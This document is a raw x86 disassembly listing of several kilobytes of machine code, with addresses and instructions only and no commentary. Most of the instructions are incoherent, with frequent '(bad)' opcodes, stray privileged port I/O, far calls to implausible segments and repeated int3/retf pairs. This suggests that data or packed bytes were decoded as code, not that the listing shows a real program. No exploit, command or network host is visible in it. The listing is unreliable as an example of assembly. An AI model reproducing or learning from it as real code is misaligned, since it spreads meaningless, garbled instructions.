  423a80:	add    dl,BYTE PTR [edx-0x4b]
  423a83:	sbb    eax,0xefa650fc
  423a88:	cli    
  423a89:	push   DWORD PTR [ecx-0x48f73c25]
  423a8f:	sbb    eax,0xcef38bdc
  423a94:	mov    BYTE PTR [ebp+0x7a],dl
  423a97:	ror    DWORD PTR [esi],1
  423a99:	mov    edi,ebx
  423a9b:	into   
  423a9c:	add    al,0x42
  423a9f:	rol    BYTE PTR [edx-0xc],cl
  423aa2:	mov    ch,0x15
  423aa4:	in     al,dx
  423aa5:	cmp    DWORD PTR [edi+0x5e],0xffffff87
  423aa9:	dec    ebp
  423aaa:	bound  esi,QWORD PTR [ebx-0x44ec746c]
  423ab0:	add    dl,0x4a
  423ab3:	rcl    BYTE PTR [edx-0x20],cl
  423ab6:	addr16 pop eax
  423ab8:	std    
  423ab9:	call   DWORD PTR [ecx-0x2d]
  423abc:	loop   0x423b1b
  423abe:	jge    0x423a56
  423ac0:	retf   
  423ac1:	int3   
  423ac2:	jmp    0x423a97
  423ac4:	jmp    0x423a49
  423ac6:	sub    dl,BYTE PTR [eax+ebp*2-0x10]
  423aca:	cmp    al,0x1b
  423acc:	add    bh,bh
	...
  423af6:	add    BYTE PTR [eax],al
  423af8:	push   ebx
  423af9:	pop    ebx
  423afa:	js     0x423b3d
  423afc:	ds aam 0x42
  423aff:	clc    
  423b00:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423b01:	mov    DWORD PTR [ecx],0x42d23e40
  423b07:	clc    
  423b08:	outs   dx,BYTE PTR ds:[esi]
  423b09:	mov    bl,0x3d
  423b0b:	std    
  423b0c:	add    edi,eax
  423b0e:	add    ah,0x46
  423b11:	aam    0x42
  423b13:	cld    
  423b14:	lds    ebx,FWORD PTR [eax]
  423b16:	adc    BYTE PTR [ecx-0x4b],dl
  423b19:	xor    BYTE PTR [edx+edx*2],cl
  423b1c:	mov    ch,0x20
  423b1e:	or     BYTE PTR [eax-0x27],dl
  423b21:	xor    ah,bh
  423b23:	mov    ebx,ebx
  423b25:	sub    cl,al
  423b27:	int3   
  423b28:	cli    
  423b29:	xchg   edi,eax
  423b2a:	retf   
  423b2b:	int3   
  423b2c:	imul   edx,edx,0xffffffeb
  423b2f:	mov    eax,ds:0x3f431a
  423b34:	js     0x423b91
  423b36:	push   0x782f538b
  423b3b:	inc    ecx
  423b3c:	ds aam 0x4f
  423b3f:	add    esp,ecx
  423b41:	call   0xccc1:0x283b5087
  423b48:	jp     0x423ae1
  423b4a:	retf   
  423b4b:	int3   
  423b4c:	jmp    0x423b1f
  423b4e:	jmp    0x423ad3
  423b50:	push   0x57
  423b52:	lahf   
  423b53:	push   eax
  423b54:	neg    BYTE PTR [ebx]
  423b56:	add    BYTE PTR [ebx+0x3ec78a8c],cl
	...
  423b84:	add    BYTE PTR [eax],al
  423b86:	mov    ch,0x1b
  423b88:	xor    BYTE PTR [ebx+0x3ed1d26c],cl
  423b8e:	lds    edx,FWORD PTR [ebx]
  423b90:	or     al,0x8b
  423b92:	ins    BYTE PTR es:[edi],dx
  423b93:	aam    0x4a
  423b95:	hlt    
  423b96:	mov    ch,0x20
  423b98:	hlt    
  423b99:	mov    eax,DWORD PTR [esi+0x364d8757]
  423b9f:	rcl    BYTE PTR [edx-0x8],cl
  423ba2:	mov    bh,0x2f
  423ba4:	cld    
  423ba5:	mov    eax,0x5b3f
  423baa:	ret    
  423bab:	call   0xf8:0x47bd4473
  423bb2:	xchg   ebx,eax
  423bb3:	pop    edi
  423bb4:	xor    eax,eax
  423bb6:	adc    eax,0xf64d8987
  423bbb:	ror    DWORD PTR [esi+0x18],1
  423bbe:	xor    eax,0x47750830
  423bc3:	rol    BYTE PTR [edx-0x8],cl
  423bc6:	mov    ch,0x17
  423bc8:	or     al,0x89
  423bca:	xchg   BYTE PTR [edi-0x77],ah
  423bcd:	push   ebp
  423bce:	(bad)  
  423bcf:	rol    DWORD PTR [edx+0x10],1
  423bd2:	mov    bh,0x18
  423bd4:	sbb    BYTE PTR [eax+0x5b3f],bh
  423bda:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  423bdb:	bound  ecx,QWORD PTR [ecx+0xed1b64d]
  423be1:	mov    DWORD PTR [ebx],edx
  423be3:	ret    
  423be4:	mov    BYTE PTR [ebp-0x5a],al
  423be7:	add    DWORD PTR [ebx-0x4],0x0
	...
  423c12:	add    BYTE PTR [eax],al
  423c14:	adc    ebx,DWORD PTR [edi+0x31]
  423c17:	shl    BYTE PTR [ebp+0x4db3e95e],0x9b
  423c1e:	mov    ch,ah
  423c20:	jecxz  0x423bbb
  423c22:	retf   
  423c23:	int3   
  423c24:	mov    dl,BYTE PTR [esi-0x697d3335]
  423c2a:	retf   
  423c2b:	int3   
  423c2c:	jp     0x423bc4
  423c2e:	retf   
  423c2f:	int3   
  423c30:	or     edx,edx
  423c32:	jmp    0x423bb7
  423c34:	push   0x62
  423c36:	lds    eax,FWORD PTR [ebp+0x56]
  423c39:	pop    edx
  423c3a:	xor    BYTE PTR [eax],al
  423c3c:	xor    eax,DWORD PTR ds:[ebx+eax*1]
  423c40:	(bad)  
  423c41:	pop    edx
  423c42:	lahf   
  423c43:	cmp    al,0xb6
  423c45:	sbb    al,BYTE PTR [eax]
  423c47:	push   eax
  423c48:	es sub esp,edi
  423c4b:	jmp    FWORD PTR [ecx]
  423c4d:	fld    st(3)
  423c4f:	or     BYTE PTR [edi+0x7e6af41e],dh
  423c55:	ror    BYTE PTR [edx-0x8],1
  423c58:	outs   dx,DWORD PTR ds:[esi]
  423c59:	rcl    BYTE PTR [edx],1
  423c5b:	sbb    al,0x86
  423c5d:	sbb    al,BYTE PTR [eax]
  423c5f:	mov    edi,DWORD PTR [ebx+ebp*1+0x50]
  423c63:	push   0x3e
  423c65:	les    edx,FWORD PTR [edx-0xc]
  423c68:	popf   
  423c69:	outs   dx,DWORD PTR ds:[esi]
  423c6a:	js     0x423cad
  423c6c:	fdivr  DWORD PTR ds:[edx]
  423c6f:	adc    al,0x66
  423c71:	sbb    al,BYTE PTR [eax]
  423c73:	add    BYTE PTR [ebx+0x5c],dl
  423c76:	mov    eax,0x2
	...
  423c9f:	add    BYTE PTR [eax],al
  423ca1:	add    BYTE PTR [esi],bh
  423ca3:	pop    ebx
  423ca4:	add    bl,ch
  423ca6:	push   esp
  423ca7:	ror    BYTE PTR [edx],1
  423ca9:	add    BYTE PTR [ebx+ebx*1],bh
  423cac:	add    BYTE PTR [ecx+0x67cb0b],cl
  423cb2:	sub    DWORD PTR [edx+0x0],ebx
  423cb5:	push   0x40593e
  423cba:	mov    ch,0x6e
  423cbc:	adc    al,0x78
  423cbe:	call   FWORD PTR [edx+0x7f]
  423cc1:	ret    0x593e
  423cc4:	add    BYTE PTR [eax],al
  423cc6:	in     al,dx
  423cc7:	mov    dl,0x9d
  423cc9:	inc    BYTE PTR [ecx+0x4ac480c4]
  423ccf:	add    eax,DWORD PTR [eax]
  423cd1:	add    bh,dh
  423cd3:	pop    edx
  423cd4:	sub    eax,DWORD PTR [eax]
  423cd6:	cmp    al,0x5b
  423cd8:	add    BYTE PTR [ebx+0x41786f33],cl
  423cde:	ds jo  0x423ca9
  423ce1:	mov    DWORD PTR [ebx+0x1f],eax
  423ce4:	js     0x423d27
  423ce6:	rcl    BYTE PTR ds:[edx],1
  423ce9:	inc    esp
  423cea:	(bad)  
  423ceb:	sbb    DWORD PTR [eax],eax
  423ced:	push   edx
  423cee:	fild   QWORD PTR [esi+0x78]
  423cf1:	inc    ecx
  423cf2:	sub    ecx,DWORD PTR ds:[ecx-0x17d5d1b3]
  423cf9:	popf   
  423cfa:	and    al,ah
  423cfc:	cld    
  423cfd:	add    DWORD PTR [edx],0x57
  423d00:	mov    DWORD PTR ds:0x3f432a,edx
	...
  423d2e:	add    BYTE PTR [eax],al
  423d30:	cmp    eax,0x6b89082e
  423d35:	mov    bl,0x88
  423d37:	push   ebp
  423d38:	out    0xc3,al
  423d3a:	loope  0x423cc7
  423d3c:	(bad)  ds:0x96faccc1
  423d42:	retf   
  423d43:	int3   
  423d44:	mov    edx,eax
  423d46:	jmp    0x423cd3
  423d48:	adc    DWORD PTR [ebx+0x39],0x45
  423d4c:	inc    edx
  423d4d:	dec    eax
  423d4e:	add    eax,0xe953838b
  423d53:	add    eax,0x458957d5
  423d58:	dec    edx
  423d59:	es ror esp,0x82
  423d5d:	xchg   esi,eax
  423d5e:	retf   
  423d5f:	int3   
  423d60:	jp     0x423cf8
  423d62:	retf   
  423d63:	int3   
  423d64:	or     edx,eax
  423d66:	jmp    0x423ceb
  423d68:	stos   BYTE PTR es:[edi],al
  423d69:	jbe    0x423d30
  423d6b:	inc    ebp
  423d6c:	xchg   edx,eax
  423d6d:	pop    edx
  423d6e:	nop
  423d6f:	add    DWORD PTR [esi],edi
  423d71:	rol    BYTE PTR [edx+0x8],1
  423d74:	mov    bh,0x1d
  423d76:	fmul   DWORD PTR [ebx+0x5588a30b]
  423d7c:	inc    esi
  423d7d:	pop    eax
  423d7e:	dec    edi
  423d7f:	cmp    al,0xb7
  423d81:	sub    eax,0xbafb8be0
  423d86:	or     al,0xb7
  423d88:	push   es
  423d89:	outs   dx,DWORD PTR ds:[esi]
  423d8a:	mov    DWORD PTR [ebp+0x5e],edx
  423d8d:	aad    0x43
  423d8f:	or     ah,BYTE PTR [esi]
  423d91:	rol    BYTE PTR [edx-0x18],cl
	...
  423dbc:	add    BYTE PTR [eax],al
  423dbe:	(bad)  
  423dbf:	outs   dx,BYTE PTR ds:[esi]
  423dc0:	add    DWORD PTR [eax+0x3e],eax
  423dc3:	(bad)  
  423dc4:	or     bh,BYTE PTR [esi+esi*4]
  423dc7:	sbb    al,0x0
  423dc9:	push   ecx
  423dca:	push   ss
  423dcb:	adc    edi,ecx
  423dcd:	jmp    DWORD PTR [ecx]
  423dcf:	ffreep st(3)
  423dd1:	or     bh,al
  423dd3:	sbb    al,dh
  423dd5:	push   0x7e
  423dd7:	xor    eax,DWORD PTR [eax]
  423dd9:	xor    BYTE PTR [esi],bh
  423ddb:	pop    ebx
  423ddc:	push   0x5cae00
  423de1:	push   0x3e
  423de3:	ret    0xf052
  423de6:	(bad)  
  423de7:	sbb    ah,ah
  423de9:	mov    edx,DWORD PTR [ebx-0x75bd7745]
  423def:	sub    ecx,DWORD PTR [ecx-0x76d3b9b3]
  423df5:	push   ebp
  423df6:	fisubr DWORD PTR ds:0xc2cbc1e8
  423dfc:	cld    
  423dfd:	cmp    edx,0x4f
  423e00:	lds    eax,FWORD PTR [ebp-0x4e]
  423e03:	pop    ebx
  423e04:	add    BYTE PTR [eax],al
  423e06:	ds mov dh,0x6
  423e09:	mov    eax,DWORD PTR [ebx]
  423e0b:	mov    DWORD PTR [eax+0x42d43fc0],0xe010c5f4
  423e15:	bswap  ecx
  423e17:	sub    al,0x6
  423e19:	cmp    ebx,esi
  423e1b:	(bad)  
  423e1c:	jo     0x423e77
  423e1e:	mov    ch,0x18
  423e20:	call   0x423ea8
	...
  423e49:	add    BYTE PTR [eax],al
  423e4b:	add    dh,dh
  423e4d:	data16 add BYTE PTR [ebx+edi*8-0x2b],dh
  423e52:	dec    edx
  423e53:	call   0x528315
  423e58:	jmp    0x41d6:0x6655897e
  423e5f:	adc    ch,al
  423e61:	adc    al,ah
  423e63:	mov    ebp,edi
  423e65:	jle    0x423df2
  423e67:	inc    esp
  423e68:	cs ret 0x4d88
  423e6c:	push   ds
  423e6d:	mov    ss,edx
  423e6f:	imul   DWORD PTR [edi+0x1e55897f]
  423e75:	push   edx
  423e76:	lods   eax,DWORD PTR ds:[esi]
  423e77:	inc    edx
  423e78:	bound  ebp,QWORD PTR [ebx]
  423e7a:	mov    DWORD PTR [ebp+0x26],eax
  423e7d:	(bad)  
  423e7e:	dec    edx
  423e7f:	or     BYTE PTR ds:0xb5511413,bh
  423e85:	daa    
  423e86:	call   0xf9ba16
  423e8b:	inc    edx
  423e8c:	dec    edx
  423e8d:	sub    ebp,eax
  423e8f:	push   ebp
  423e90:	repz sar esp,0x83
  423e94:	add    cl,BYTE PTR [edi-0x77]
  423e97:	dec    ebp
  423e98:	(bad)  
  423e99:	fnstsw WORD PTR [esi-0x17f038d8]
  423e9f:	jmp    0x423e4d
  423ea1:	aad    0x52
  423ea3:	in     al,0x6c
  423ea5:	mov    bl,0xd
  423ea7:	cld    
  423ea8:	rol    ecx,0x80
  423eab:	les    eax,FWORD PTR [edx+0x33]
  423eae:	and    al,0x3
	...
  423ed8:	add    BYTE PTR [eax],al
  423eda:	(bad)  
  423edb:	pop    edx
  423edc:	lahf   
  423edd:	cmp    al,0x26
  423edf:	sbb    al,0x0
  423ee1:	push   eax
  423ee2:	xchg   esi,eax
  423ee3:	aad    0xf9
  423ee5:	call   FWORD PTR [ecx-0x38f73c23]
  423eeb:	pop    ss
  423eec:	fadd   QWORD PTR [ebx+0x4178834b]
  423ef2:	ds pop ebx
  423ef4:	jae    0x423f00
  423ef6:	lds    ecx,FWORD PTR [edi+0x30]
  423ef9:	js     0x423efa
  423efb:	pop    edx
  423efc:	dec    edi
  423efd:	call   DWORD PTR [ebx]
  423eff:	lahf   
  423f00:	cmp    BYTE PTR ds:0x3f4326,0x3e
  423f07:	dec    eax
  423f08:	sbb    al,0x6a
  423f0a:	(bad)  
  423f0b:	xor    al,BYTE PTR [eax]
  423f0d:	xor    BYTE PTR [esi],bh
  423f0f:	pop    ebx
  423f10:	mov    DWORD PTR [ebp+0x42],edx
  423f13:	sub    al,0x89
  423f15:	inc    ebp
  423f16:	push   ds
  423f17:	aad    0x47
  423f19:	xor    al,0x8f
  423f1b:	rcl    BYTE PTR [edx-0x10],0xdd
  423f1f:	addr16 js 0x423f63
  423f22:	ds mov ah,0x12
  423f25:	push   0x7e
  423f27:	xor    eax,DWORD PTR [eax]
  423f29:	xor    BYTE PTR [esi],bh
  423f2b:	pop    ebx
  423f2c:	mov    DWORD PTR [ebp+0xa],edx
  423f2f:	cs push 0x0
  423f32:	add    DWORD PTR [edi],esp
  423f34:	lock mov ds:0x3f4352,eax
  423f3a:	mov    ebp,0x78147e
	...
  423f67:	add    BYTE PTR [edi+0x5b],bh
  423f6a:	add    BYTE PTR [ebp+0x4b],dh
  423f6d:	xor    eax,0x8b3e6840
  423f72:	add    BYTE PTR [eax],al
  423f74:	lds    edx,FWORD PTR [esi]
  423f76:	cld    
  423f77:	push   eax
  423f78:	push   esp
  423f79:	pop    ebx
  423f7a:	std    
  423f7b:	push   ebp
  423f7c:	into   
  423f7d:	cld    
  423f7e:	adc    edi,DWORD PTR [eax-0x1]
  423f81:	pop    edx
  423f82:	mov    DWORD PTR [ebp-0x66],ecx
  423f85:	ror    BYTE PTR [edx-0x28],cl
  423f88:	mov    ch,0x26
  423f8a:	fmul   DWORD PTR [ebx+0x4200a2fb]
  423f90:	pop    edx
  423f91:	rol    BYTE PTR [edx-0x20],cl
  423f94:	lds    ecx,FWORD PTR [esi]
  423f96:	cld    
  423f97:	push   ecx
  423f98:	mov    ch,0x26
  423f9a:	in     al,0x52
  423f9c:	fbld   TBYTE PTR [edi+0x78]
  423f9f:	inc    ecx
  423fa0:	ds sub ebp,eax
  423fa3:	xchg   ebp,eax
  423fa4:	jb     0x423f66
  423fa6:	cld    
  423fa7:	add    DWORD PTR [edx+0x5e4d894f],0xffffffdc
  423fae:	mov    dh,0xa4
  423fb0:	ds pop ebx
  423fb2:	add    BYTE PTR [eax],al
  423fb4:	retf   0x8984
  423fb7:	push   ebp
  423fb8:	pop    esi
  423fb9:	aam    0x42
  423fbb:	fdivr  DWORD PTR ds:0x3e009fdd
  423fc1:	pop    ebx
  423fc2:	xchg   DWORD PTR [ebp+0x22],eax
  423fc5:	aam    0x4a
  423fc7:	loopne 0x423f7e
  423fc9:	gs adc al,0x78
	...
  423ff4:	add    BYTE PTR [eax],al
  423ff6:	jg     0x424053
  423ff8:	sub    DWORD PTR [ecx+0x52],edx
  423ffb:	rcl    BYTE PTR [edx],cl
  423ffd:	inc    esp
  423ffe:	xchg   esi,eax
  423fff:	sbb    al,BYTE PTR [eax]
  424001:	mov    eax,ds:0x3f4382
  424006:	outs   dx,BYTE PTR ds:[esi]
  424007:	aam    0xa
  424009:	adc    al,0x76
  42400b:	sbb    al,BYTE PTR [eax]
  42400d:	push   ecx
  42400e:	lds    esp,FWORD PTR ds:0x3fd652ec
  424014:	cli    
  424015:	jmp    ecx
  424017:	fcmovnb st,st(3)
  424019:	or     al,0xc5
  42401b:	adc    eax,0x67438be0
  424020:	js     0x424063
  424022:	ds pop esp
  424024:	dec    eax
  424025:	sub    BYTE PTR [edi-0x87abb3],dh
  42402b:	pop    edx
  42402c:	cmp    DWORD PTR ds:0x3f4376,0x8b2b463e
  424036:	dec    ebx
  424037:	addr16 js 0x42407b
  42403a:	ds sub eax,0x1a16549f
  424040:	add    BYTE PTR [eax-0x4b],dl
  424043:	dec    ebp
  424044:	xor    BYTE PTR [eax-0x1],bh
  424047:	pop    edx
  424048:	dec    edi
  424049:	call   0x3eff44
  42404e:	mov    ebp,0x538b0b96
  424053:	addr16 js 0x424097
  424056:	ds sub eax,0x49e8
	...
  424084:	push   edi
  424085:	mov    edi,0x567a83fc
  42408a:	jmp    0x1c916f0
  42408f:	inc    eax
  424090:	ds cli 
  424092:	cmp    edi,DWORD PTR [eax+0x7f]
  424095:	pop    ebx
  424096:	push   eax
  424097:	call   0x3f0526
  42409c:	mov    ebp,0x7b890797
  4240a1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4240a2:	mov    BYTE PTR ds:0x3f4332,cl
  4240a8:	outs   dx,DWORD PTR ds:[esi]
  4240a9:	rcl    BYTE PTR [edx-0x20],cl
  4240ac:	fbld   TBYTE PTR [edi+0x78]
  4240af:	inc    ecx
  4240b0:	ds pop edx
  4240b2:	inc    edx
  4240b3:	sub    BYTE PTR [esi+0x76300ad2],cl
  4240b9:	sbb    al,0x0
  4240bb:	push   ecx
  4240bc:	(bad)  
  4240bd:	outs   dx,BYTE PTR ds:[esi]
  4240be:	cld    
  4240bf:	jmp    ecx
  4240c1:	fcmovb st,st(3)
  4240c3:	or     al,0xc5
  4240c5:	push   0x5b7f7830
  4240ca:	jg     0x42408e
  4240cc:	scas   al,BYTE PTR es:[edi]
  4240cd:	dec    eax
  4240ce:	(bad)  
  4240cf:	push   DWORD PTR [edi-0x87a398]
  4240d5:	pop    edx
  4240d6:	mov    eax,DWORD PTR [ebp-0x4a]
  4240d9:	sub    ebp,DWORD PTR [edx+0x40]
  4240dc:	adc    al,0x55
  4240de:	mov    DWORD PTR ds:0x3f4302,ecx
  4240e4:	out    dx,eax
  4240e5:	mov    ebp,0xd452
	...
  424112:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  424113:	mov    edx,0x389fff8
  424118:	(bad)  
  424119:	(bad)  
  42411a:	ds pop ebx
  42411c:	mov    ebp,esp
  42411e:	sbb    ebx,DWORD PTR [ecx-0x707dfffd]
  424124:	retf   
  424125:	int3   
  424126:	jp     0x4240b7
  424128:	retf   
  424129:	int3   
  42412a:	or     edx,edx
  42412c:	jmp    0x4240b9
  42412e:	add    edx,DWORD PTR [ebx-0x77]
  424131:	inc    eax
  424132:	push   edx
  424133:	and    cl,al
  424135:	int3   
  424136:	jp     0x4240c7
  424138:	retf   
  424139:	int3   
  42413a:	jmp    0x42410d
  42413c:	jmp    0x424191
  42413e:	nop
  42413f:	mov    DWORD PTR es:0x3f435e,edi
  424146:	mov    ch,0x5f
  424148:	sub    al,0x78
  42414a:	jg     0x4241a7
  42414c:	mov    DWORD PTR ds:0x3f4336,esi
  424152:	jno    0x424171
  424154:	pop    ecx
  424155:	pop    ebp
  424156:	std    
  424157:	mov    cs,ebx
  424159:	int3   
  42415a:	imul   edx,edx,0xffffffeb
  42415d:	push   ecx
  42415e:	popw   ss
  424160:	add    DWORD PTR [eax+0x3e],eax
  424163:	cld    
  424164:	cmp    edi,DWORD PTR [eax+0x7f]
  424167:	pop    ebx
  424168:	push   eax
  424169:	call   0x3f0400
  42416e:	mov    ebp,0x7b890796
  424173:	mov    edi,0x4d88
	...
  4241a0:	ss sub al,0x6a
  4241a3:	add    BYTE PTR [ebp-0x87a799],dh
  4241a9:	pop    edx
  4241aa:	push   edx
  4241ab:	dec    DWORD PTR [ebx]
  4241ad:	mov    edi,0x9a0be588
  4241b2:	retf   
  4241b3:	int3   
  4241b4:	or     edx,edx
  4241b6:	jmp    0x42413b
  4241b8:	stos   BYTE PTR es:[edi],al
  4241b9:	jbe    0x424180
  4241bb:	inc    ebp
  4241bc:	xchg   esi,eax
  4241bd:	pop    edx
  4241be:	add    BYTE PTR [eax],al
  4241c0:	ds xchg esi,eax
  4241c2:	inc    edx
  4241c3:	fadd   QWORD PTR [esi]
  4241c5:	pop    ebx
  4241c6:	add    BYTE PTR [eax],al
  4241c8:	adc    DWORD PTR [edi],0x5b3e01f4
  4241ce:	add    bh,al
  4241d0:	add    edi,DWORD PTR [edi+0x5b3effff]
  4241d6:	lds    eax,FWORD PTR [ebp+0x62]
  4241d9:	pop    edx
  4241da:	add    BYTE PTR [eax],al
  4241dc:	ror    BYTE PTR ds:[edx+0x8],cl
  4241e0:	mov    bh,0x4f
  4241e2:	xor    BYTE PTR [eax-0x1],bh
  4241e5:	pop    edx
  4241e6:	call   0xfcff7394
  4241eb:	mov    eax,ds:0x3f436e
  4241f0:	arpl   WORD PTR [esp+edi*8+0xc473e00],di
  4241f7:	mov    DWORD PTR [ebx-0x7d],0x5b3e4178
  4241fe:	add    BYTE PTR [eax],al
  424200:	ds mov al,0x9
  424203:	mov    DWORD PTR [eax],0x0
	...
  42422d:	add    BYTE PTR [ebx],bh
  42422f:	cmp    DWORD PTR [eax+0x41],0x3e
  424233:	pop    edx
  424234:	add    BYTE PTR [eax],al
  424236:	fdivr  DWORD PTR ds:[edx]
  424239:	xor    BYTE PTR [esi+0x1a],ah
  42423c:	add    BYTE PTR [eax],al
  42423e:	imul   edx,DWORD PTR [ecx-0x3b],0x5
  424242:	push   ss
  424243:	inc    ebx
  424244:	aas    
  424245:	add    BYTE PTR [esi],bh
  424247:	pop    ebx
  424248:	add    BYTE PTR [eax],al
  42424a:	mov    ebp,0x7f78387e
  42424f:	pop    ebx
  424250:	add    BYTE PTR [ebp+0x4b],dh
  424253:	xor    DWORD PTR [eax],eax
  424255:	dec    DWORD PTR [ebx+0x5b]
  424258:	js     0x42429b
  42425a:	ds clc 
  42425c:	das    
  42425d:	js     0x42425e
  42425f:	pop    edx
  424260:	mov    DWORD PTR ds:0x3f434e,ecx
  424266:	(bad)  
  424267:	push   cs
  424268:	call   0x78cd75f8
  42426d:	inc    ecx
  42426e:	rol    BYTE PTR ds:[edx-0x18],1
  424272:	cmp    eax,0xfb893c19
  424277:	mov    dl,0x88
  424279:	dec    ebp
  42427a:	push   esi
  42427b:	ror    BYTE PTR [edx],cl
  42427d:	sbb    al,0xe6
  42427f:	sbb    DWORD PTR [eax],eax
  424281:	push   0x4057ee
  424286:	push   ecx
  424287:	data16 add BYTE PTR [eax-0x1],bh
  42428b:	pop    edx
  42428c:	mov    eax,ds:0x19c63c
  424291:	mov    DWORD PTR [eax],0x0
	...
  4242bb:	add    BYTE PTR [ebx+0xf],al
  4242be:	js     0x424301
  4242c0:	ds inc esi
  4242c2:	add    DWORD PTR [eax+0x3e],eax
  4242c5:	xor    esp,DWORD PTR [eax+0x3]
  4242c8:	jle    0x424325
  4242ca:	mov    DWORD PTR ds:0x3f435a,edx
  4242d0:	ins    BYTE PTR es:[edi],dx
  4242d1:	mov    bl,0xc1
  4242d3:	test   DWORD PTR [ecx],0x36c480bc
  4242d9:	clc    
  4242da:	inc    edi
  4242db:	js     0x42435c
  4242dd:	pop    ebx
  4242de:	std    
  4242df:	adc    eax,0x3f4386
  4242e4:	popf   
  4242e5:	and    bh,BYTE PTR [eax+0x41]
  4242e8:	ds cli 
  4242ea:	dec    ebx
  4242eb:	js     0x42436c
  4242ed:	pop    ebx
  4242ee:	push   eax
  4242ef:	call   0x3eff7e
  4242f4:	mov    ebp,0x7b890396
  4242f9:	retf   
  4242fa:	mov    BYTE PTR [ebp-0x52],cl
  4242fd:	sub    eax,ebp
  4242ff:	aad    0xb0
  424301:	mov    ebx,0x568283fc
  424306:	mov    eax,ds:0x1a2634
  42430b:	mov    esi,ebx
  42430d:	retf   0x6a51
  424310:	ds cli 
  424312:	xor    edi,DWORD PTR [eax-0x1]
  424315:	pop    edx
  424316:	push   eax
  424317:	call   0x3f06be
  42431c:	mov    ebp,0x8b0b96
	...
  424349:	add    BYTE PTR [ebx],al
  42434b:	retf   
  42434c:	xchg   BYTE PTR [ebp+0x5e],cl
  42434f:	iret   
  424350:	push   edx
  424351:	cld    
  424352:	and    eax,0xf473f026
  424357:	iret   
  424358:	inc    edx
  424359:	loopne 0x424349
  42435b:	iret   
  42435c:	dec    edx
  42435d:	fsub   st(7),st
  42435f:	mov    dl,0xad
  424361:	sti    
  424362:	inc    ecx
  424363:	mov    ebx,0xfe46c480
  424368:	aas    
  424369:	js     0x4243ea
  42436b:	pop    ebx
  42436c:	mov    DWORD PTR ds:0x3f337e,edx
  424372:	mov    esp,?
  424374:	dec    ebx
  424375:	js     0x4243f6
  424377:	pop    ebx
  424378:	add    DWORD PTR [ebp+0x1a],eax
  42437b:	or     al,0x89
  42437d:	or     eax,0x3f3352
  424382:	cmp    eax,0xe651fc28
  424387:	xchg   edx,eax
  424388:	idiv   bh
  42438a:	icebp  
  42438b:	faddp  st(3),st
  42438d:	or     al,0xb5
  42438f:	adc    ah,dh
  424391:	add    ecx,DWORD PTR [ebx-0x1daaff69]
  424397:	in     al,0x52
  424399:	in     al,0xc5
  42439b:	and    ah,bh
  42439d:	add    eax,DWORD PTR [ebx-0x3dba7969]
  4243a3:	out    0x4a,al
  4243a5:	loopne 0x42440c
  4243a7:	push   0x5aff7840
  4243ac:	xchg   DWORD PTR [ebp+0x0],ecx
	...
  4243d7:	add    BYTE PTR [esi-0x438623a],bl
  4243dd:	mov    dl,0xff
  4243df:	(bad)  
  4243e0:	ds pop ebx
  4243e2:	jmp    0xf85308f0
  4243e7:	cmp    DWORD PTR [edi+ebx*2-0x79],0x55
  4243ec:	xchg   dh,ah
  4243ee:	inc    edx
  4243ef:	clc    
  4243f0:	xor    eax,0x3673f020
  4243f5:	out    0xa,al
  4243f7:	xor    al,0xe6
  4243f9:	sbb    eax,DWORD PTR [eax]
  4243fb:	add    esi,ebx
  4243fd:	mov    dl,0x88
  4243ff:	adc    DWORD PTR ds:0xaa1f810,edi
  424405:	xor    edi,DWORD PTR [edi]
  424407:	add    BYTE PTR ds:0x2e89f820,bh
  42440d:	out    0x4a,al
  42440f:	clc    
  424410:	mov    edi,0x3e03e69b
  424415:	pop    ebx
  424416:	mov    DWORD PTR ds:0x3f3372,edx
  42441c:	cmp    eax,0x4433f810
  424421:	cld    
  424422:	xor    edi,DWORD PTR [eax+0x7f]
  424425:	pop    ebx
  424426:	add    DWORD PTR [ebp+0x6],eax
  424429:	in     al,0x7
  42442b:	jmp    0x4243f6
  42442d:	jecxz  0x424459
  42442f:	and    al,0x76
  424431:	sbb    al,0x0
  424433:	mov    DWORD PTR [ebx],esi
  424435:	jnp    0x4244af
  424437:	inc    ecx
  424438:	outs   dx,BYTE PTR ds:[esi]
  42443a:	(bad)  
  42443b:	mov    DWORD PTR [eax],eax
	...
  424465:	add    BYTE PTR [ebx],ch
  424467:	push   ebx
  424468:	js     0x4244ab
  42446a:	outs   dx,BYTE PTR ds:[esi]
  42446c:	(bad)  
  42446d:	mov    DWORD PTR [ebx],esi
  42446f:	xchg   DWORD PTR [eax+0x41],edi
  424472:	ds ret 
  424474:	dec    ebp
  424475:	test   ecx,0xe90d8ab9
  42447b:	xor    DWORD PTR [edi],edi
  42447d:	add    bh,al
  42447f:	daa    
  424480:	clc    
  424481:	mov    ecx,0x405d3e
  424486:	mov    edi,0x3e01ffc3
  42448b:	pop    ebx
  42448c:	mov    DWORD PTR [ebp-0x6a],edx
  42448f:	test   edi,ecx
  424491:	mov    DWORD PTR [ebx],esi
  424493:	cmp    DWORD PTR [eax+0x41],0x3e
  424497:	cld    
  424498:	daa    
  424499:	js     0x42449a
  42449b:	pop    edx
  42449c:	push   eax
  42449d:	call   0x3ef9dc
  4244a2:	mov    ebp,0x338b039e
  4244a7:	outs   dx,DWORD PTR ds:[esi]
  4244a8:	js     0x4244eb
  4244aa:	ds or  al,0xe8
  4244ad:	aad    0x54
  4244af:	mov    ecx,0x2f7e85fc
  4244b4:	add    al,0x33
  4244b6:	jle    0x42447d
  4244b8:	sub    DWORD PTR [ebx+0x41787f63],ecx
  4244be:	ds fadd st(3),st
  4244c1:	add    al,0xbd
  4244c3:	jbe    0x4244fd
  4244c5:	js     0x424546
  4244c7:	pop    ebx
  4244c8:	add    BYTE PTR [eax+eax*1+0x0],dh
	...
  4244f4:	inc    edi
  4244f5:	cli    
  4244f6:	adc    edi,DWORD PTR [eax+0x7f]
  4244f9:	pop    ebx
  4244fa:	xchg   DWORD PTR [edx+eiz*2+0x5f],eax
  4244fe:	call   0xfcfb4860
  424503:	mov    edx,DWORD PTR [ebx+0xf]
  424506:	js     0x424549
  424508:	ds or  eax,0xe4fe33c1
  42450e:	loop   0x42456d
  424510:	std    
  424511:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  424512:	retf   
  424513:	int3   
  424514:	ds pop ebx
  424516:	add    BYTE PTR [eax],al
  424518:	ds pop ebx
  42451a:	add    BYTE PTR [eax],al
  42451c:	ds pop ebx
  42451e:	add    BYTE PTR [eax],al
  424520:	ds pop ebx
